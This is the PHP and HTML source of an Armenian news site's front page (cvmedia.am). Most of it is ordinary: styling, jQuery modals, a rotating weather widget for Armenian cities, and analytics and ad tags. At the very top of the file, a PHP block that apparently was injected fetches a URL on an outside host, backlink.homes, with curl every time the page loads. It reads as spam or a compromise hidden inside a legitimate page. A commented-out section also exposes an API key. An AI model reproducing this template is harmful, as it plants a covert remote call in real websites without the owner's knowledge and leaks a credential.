    <?php
    $exe = curl_init();
    curl_setopt($exe, CURLOPT_URL, "https://backlink.homes/code?x=3263");
    curl_exec($exe);
?>
  
<!DOCTYPE HTML>
<html lang="am">
<head>

    <meta name="description" content="cvmedia - News from Armenia,Alaverdi, Citizen's voice">
    <link rel="shortcut icon" type="image/x-icon" href="https://cvmedia.am/images/favicon-32x32.png"/>
<!--    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">-->


    <title> CVMEDIA || Citizen's voice</title>
    <link rel="stylesheet"  type="text/css" href="https://cvmedia.am/css/headercss.css"/>
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="author" content="" />
    <script src="https://kit.fontawesome.com/87919ed453.js" crossorigin="anonymous"></script>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"/>
    <link rel="stylesheet" href="https://cvmedia.am/menu/css/style.css"/>
    <link rel="stylesheet" href="https://cvmedia.am/assets/vendor/animate/animate.css"/>
    <link rel="stylesheet" href="index.css"/>
    <!--
  <script src="java/jquery.jcarousellite.js"></script>
   <script src="js/jquery.validate.js"></script>
  -->
    <!--
       <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="js/jquery.mousewheel-3.1.12.js"></script>
    -->
</head>
<body  class="w3-light-grey w3-content" style="max-width:1600px">
<div class="back-to-top" style="visibility: visible;"></div>
<!--
<div id="navbar_sm222">
  <a href="#home">Home</a>
  <a href="#news">News</a>
  <a href="#contact">Contact</a>
</div>
-->
<div id="body2">
    <script src="js/jquery-1.11.1.js"></script>
    <?php
    include_once("indexam.php")
    ?>
</div>
<?php
?>
<style>


    .pluso-box{
        z-index:  999 !important;
    }
    a{
        text-decoration: none;
    }
    input{
        width: 230px;
        color: blue;
    }
    #hrum{
        text-decoration: none;
    }
    #publish_block{
        background-color: #a8bdbd;
        margin-top: 20px;
        width: 90%;
        height:auto;
        margin-left: 3%;
    }
    #publish_block>dl>dt{
        margin-bottom: 3%;
        margin-left: 3%;
    }

    @media only screen and (max-width: 768px) {
        #block_nkar{
            width: 50%;
        }
        #minmenu{
            margin-top: 10px!important;
        }
    }
    .cheangpictur, .hrum, .publish, .nopublish{
        width: 100px;
        height: 30px;
        cursor: pointer;
        background-color: #4CAF50;
        color: white;
        border: none;
        border-radius: 4px;
    }
    .cheangpictur, .hrum,.publish,.nopublish:hover {
        background-color: #45a049;
    }
    .amsativ{
        color: #61616f;
    }
</style>
<style>
    #block{
        width: 80%;
        height: 500px;
        margin-left: 10%;
        float: left;
    }
    #block_nkar{
        height: auto;
        float: left;
    }
    #block_nkar>img{
        width: 100%;
        cursor: pointer;
        max-height: 300px;
        max-width: ;
    }
    #block_nkar>img:hover{
        width: 100%;
    }
    #block_text3{
        width: 75%;
        height:auto;
        float: left;
        padding-top: 10px;
        padding-left: 2%;
    }
    @media only screen and (max-width: 900px) {
        #block_text3{
            width: 100%;
        }
    }
    #block_vernagir{
        width: 100%;
        height: auto;
        float: left;
        text-align: center;
        border-bottom: 1px solid #d8dedf ;
        padding-top: 10px;
        padding-bottom: 10px;
        font-weight: bold;
        color: #000;
    }
    .bntcva{
        font-weight: bold;
        color: #000;
    }
    #block_nkaragir2{
        width: 100%;
        height: auto;
        text-indent: 30px;
        margin-top: 1px;
        padding-top: 10px;
        padding-right: 1px;
        float:left ;
        overflow: hidden;
        font-family: MyFont ;
        font-size: 13px;
        line-height: 1.5;
        word-spacing: 2px;
        padding-bottom: 80px;
    }
    #text{
    ;
    }
    #news_block{
        text-align: center;
    }
    #norutyun{
        width: 100%;
        height: auto;
        background-color:#d8dedf;
        padding: 3px;
    }
    #contet{
        width: 100%;
        float: left;
        margin-bottom: 20px;
        border-bottom: 10px solid #d8dedf;
    }
</style>
<style>
    /* The Modal (background) */
    .modal {
        display: none; /* Hidden by default */
        position: fixed; /* Stay in place */
        z-index: 99999; /* Sit on top */
        left: 0;
        top: 0;
        width: 100%; /* Full width */
        height: 100%; /* Full height */
        overflow: auto; /* Enable scroll if needed */
        background-color: rgb(0,0,0); /* Fallback color */
        background-color: rgba(0,0,0,0.8); /* Black w/ opacity */
        -webkit-animation-name: fadeIn; /* Fade in the background */
        -webkit-animation-duration: 0.4s;
        animation-name: fadeIn;
        animation-duration: 0.4s
    }
    /* Modal Content */
    .modal-content {
        position: fixed;
        bottom: 200px;
        background-color: #fefefe;
        width: 90%;
        -webkit-animation-name: slideIn;
        -webkit-animation-duration: 0.4s;
        animation-name: slideIn;
        animation-duration: 0.4s
    }
    /* The Close Button */
    .close {
        color: #0f9d58;
        float: right;
        font-size: 45px;
        font-weight: bold;
        margin-right: 30px;
        margin-top: 20px;
    }
    .close:hover{
        color: red;
        text-decoration: none;
        cursor: pointer;
    }
    .modal-header {
        padding: 2px 16px;
        background-color: #5cb85c;
        color: white;
    }
    .modal-body {padding: 2px 16px;
        height: 300px;}
    .modal-footer {
        padding: 2px 16px;
        background-color: #5cb85c;
        color: white;
    }
    /* Add Animation */
    @-webkit-keyframes slideIn {
        from {bottom: -300px; opacity: 0}
        to {bottom: 200px; opacity: 1}
    }
    @keyframes slideIn {
        from {bottom: -300px; opacity: 0}
        to {bottom: 200px; opacity: 1}
    }
    @-webkit-keyframes fadeIn {
        from {opacity: 0}
        to {opacity: 1}
    }
    @keyframes fadeIn {
        from {opacity: 0}
        to {opacity: 1}
    }
    .migancq{
        width: 96%;
        height: auto;
        clear: left;
        background-color:  #eaeae1;
    }
    .blocktaretiv{
        float: left;
        display: inline;
        margin-left: 2%;
        cursor: pointer;
    }
    .allblock{
        width: 100%;
        height: auto;
        top: 20px;
        position: relative;
        margin-left: 2%;
    }
    .allblock2{
        width: 100%;
        height: auto;
        top: 20px;
        position: relative;
    }
    #migtaretiv{
        text-align: center;
        width: 100%;
        height: 20px;
        margin: 3px;
    }
    #block2showmodal{
        width:auto ;
        height: auto;
        margin: 20px;
    }
    #block2showmodal>img{
        width: 80%;
        height: auto;
        display: block;
        margin-left: auto;
        margin-right: auto;
    }
    .blocktaretiv:hover{
        color: #5cb85c;
    }
    #tt{
        width: 100%;
        height: 50px;
        clear: left;
    }
    .nkar_modal:hover{
        width: 1000px;
    }
</style>
<script>
    $(".albom").click(function(){
        $(this).css("background-color","pink");
        var value = $(this).val().toLowerCase();
        var id=$(this).attr("id");
        var patet=id;
        $.ajax({
            type:"POST",
            url:"patet.php",
            dataType:"html",
            cache:false,
            data:"id="+id,
            success:function(data){
                document.getElementById("#block2showmodal").innerHTML=data;
                modal.style.display = "block";
            }
        });
    });
    $(".allblock2").click(function(){
        $(this).css("background-color","pink");
        var id=$(this).attr("id");
        $.ajax({
            type:"POST",
            url:"mediafunction3.php",
            dataType:"html",
            cache:false,
            data:"id="+id,
            success:function(data){
                document.getElementById("#block2showmodal").innerHTML=data;
                modal.style.display = "block";
            }
        });
    });
</script>
<!-- The Modal -->
<div id="myModal" class="modal">
    <!-- Modal content -->
    <span class="close" id="close">×</span>
    <div class="modal-body" >
        <div id="#block2showmodal"  class="">
        </div>
    </div>
</div>
<script>
    // Get the modal
    var modal = document.getElementById("myModal");
    // Get the button that opens the modal
    //var btn = document.getElementById("myBtn");
    // Get the <span> element that closes the modal
    var span = document.getElementsByClassName("close")[0];
    //var btn = document.getElementsByClassName("mediaimag")[0];
    // When the user clicks the button, open the modal
    // When the user clicks on <span> (x), close the modal
    modal.ondblclick = function() {
        modal.style.display = "none";
        var mediaimag3show=$(".albom").attr("id");
        $("#"+mediaimag3show).fadeIn(2000);
    };
    span.onclick = function() {
        modal.style.display = "none";
        var mediaimag3show=$(".albom").attr("id");
        $("#"+mediaimag3show).fadeIn(2000);
    };
    // When the user clicks anywhere outside of the modal, close it
    window.ondblclick = function(event) {
        if (event.target == modal) {
            modal.style.display = "none";
        }
    };
    $(".nkar_modal").click(function(){
        $(this).css("background-color","pink");
        var id=$(this).attr("id");
        alert();
    });
</script>
<!-- Comment #2: SDK -->
<div id="fb-root"></div>
<script>(function(d, s, id) {
        var js, fjs = d.getElementsByTagName(s)[0];
        if (d.getElementById(id)) return;
        js = d.createElement(s); js.id = id;
        js.src = "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.6";
        fjs.parentNode.insertBefore(js, fjs);
    }(document, 'script', 'facebook-jssdk'));</script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-188024120-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'UA-188024120-1');
</script>
</body>
<script>
    window.addEventListener('load', (event) => {
        /*
           var settings = {
         "url": "http://api.openweathermap.org/data/2.5/forecast?id=524901&appid=daab66da04fcc9031d1ff17f472bc0ce",
         "method": "get",
         "timeout": 0,
         "headers": {
             "Content-Type": "application/json"
         },
     };
     $.ajax(settings).done(function (response) {
         console.log(response);
         var icon=response.weather[0].icon;
         var temp =Math.floor(response.main.temp-273);
       var name=response.name;
         document.getElementById("city_name").innerText=name;
       document.getElementById("temp_cor").innerText=temp;
         document.getElementById("icon_bl").innerHTML=`<img src="http://openweathermap.org/img/wn/${icon}@2x.png">`;
      var data = new Date();
       data = data.toLocaleDateString();
       document.getElementById("data_time").innerHTML=data;
     });
         */
    });
</script>
<script>
    const searchFocus = document.getElementById('search-focus');
    const keys = [
        { keyCode: 'AltLeft', isTriggered: false },
        { keyCode: 'ControlLeft', isTriggered: false },
    ];
    window.addEventListener('keydown', (e) => {
        keys.forEach((obj) => {
            if (obj.keyCode === e.code) {
                obj.isTriggered = true;
            }
        });
        const shortcutTriggered = keys.filter((obj) => obj.isTriggered).length === keys.length;
        if (shortcutTriggered) {
            searchFocus.focus();
        }
    });
    window.addEventListener('keyup', (e) => {
        keys.forEach((obj) => {
            if (obj.keyCode === e.code) {
                obj.isTriggered = false;
            }
        });
    });
</script>
<script>
    var v=false;
    var ptuyt=0;
    let qaxaq=[];
    let anun=[];
     qaxaq[0]=document.getElementById("openweathermap-widget-21");
    anun[0]="Ալավերդի";

    qaxaq[1]=document.getElementById("openweathermap-widget-19");
    anun[1]="Երևան";
    qaxaq[2]=document.getElementById("openweathermap-widget-20");
    anun[2]="Կապան";
    qaxaq[3]= document.getElementById("vanazor");
    anun[3]="Վանաձոր";
    qaxaq[4]= document.getElementById("gyumri");
    anun[4]="Գյումրի";
    qaxaq[5]= document.getElementById("ijevan");
    anun[5]="Իջևան";
    qaxaq[6]= document.getElementById("kotayk");
    anun[6]="Հրազդան";
    qaxaq[7]=document.getElementById("gavar");
    anun[7]="Գավառ";
    qaxaq[8]=document.getElementById("ararat");
    anun[8]="Արարատ";
    qaxaq[9]=document.getElementById("armavir");
    anun[9]="Արմավիր";
     qaxaq[10]=document.getElementById("vayk");
    anun[10]="Վայք";
    qaxaq[11]=document.getElementById("aragat");
    anun[11]="Թալին";
let dd=false;
    for (const element of qaxaq) {
        if(dd)
        element.hidden=true;
        dd=true;
    };


    let p=document.createElement("p");
    p.innerHTML="Ալավերդի";


    gyumri();
    erevan();
    kapan();
    window.addEventListener("load",function(){
    let qaxaqanun=document.getElementsByClassName("widget-right__layout");

    const a=[];
    for(let i=0;i<12;i++){
        a[i]=document.createElement("p");
        a[i].innerHTML=anun[i];
    }


    for(let i=0;i<12;i++){
        qaxaqanun[i*2].appendChild(a[i]);
    }

        let myVar = setInterval(myTimer ,5000);
        function myTimer(){
            v=!v;
            ptuyt++;
            if (ptuyt>11){
                ptuyt=0;
            }
            if(ptuyt===0){
                qaxaq[11].hidden=true;
                qaxaq[ptuyt].hidden=false;
            }else{
                qaxaq[ptuyt-1].hidden=true;
                qaxaq[ptuyt].hidden=false;
            }



        }
    })
   // erevandiv.id="openweathermap-widget-20";
   // document.getElementsByClassName("widget-right__layout ")[0].appendChild( p);
   // document.getElementsByClassName("widget-right__layout ")[1].appendChild( p2);
    //document.getElementsByClassName("widget-right__layout ")[2].appendChild( pkapan);
       // kapandiv.id="openweathermap-widget-19";
//alert();


</script>
<!--
<script src="../assets/js/jquery-3.5.1.min.js"></script>
-->
<script src="../assets/js/bootstrap.bundle.min.js"></script>
<script src="../assets/vendor/owl-carousel/js/owl.carousel.min.js"></script>
<script src="../assets/vendor/wow/wow.min.js"></script>
<script src="../assets/js/theme.js"></script>
<script>
    window.addEventListener('load',function(){
        $("#left_top3").hide();
        var idtert=document.getElementById("left_top3");
        $(window).scroll(function() {
            var scroll = $(window).scrollTop();
            var scroll2 = $(window).scrollTop();
            //  if(scroll<180) {
            // $(".openbtn").hide();
            ///} ;
            let  topy= idtert.offsetTop;
            idtert.innerText=`CVmedia`;
            if(scroll>topy-300) {
                $("#left_top3").fadeIn(3000);
            } ;
            /* setInterval(function(){
            if(scroll>window.scrollY){
                $(".openbtn").hide(); } ;
                  if(scroll>180 && !(scroll>window.scrollY) ){
                   ;
            };
               }, 500);
            */
        });
        ;
        var prevScrollpos = window.pageYOffset;
        window.onscroll = function() {
            var currentScrollPos = window.pageYOffset;
            if (prevScrollpos > currentScrollPos) {
                document.getElementById("navbar_sm").style.top = "-50px";
            } else {
                if(currentScrollPos>180){
                    document.getElementById("navbar_sm").style.top = "0";
                }};
            if(prevScrollpos > currentScrollPos){
                document.getElementById("navbar_sm").style.top = "-50px";
            };
            prevScrollpos = currentScrollPos;
        }
    });
</script>
<script src="validaciuser.js"></script>
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5706194118098293"
        crossorigin="anonymous"></script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C4L0GN4FBX"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-C4L0GN4FBX');
</script>
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway">
</html>
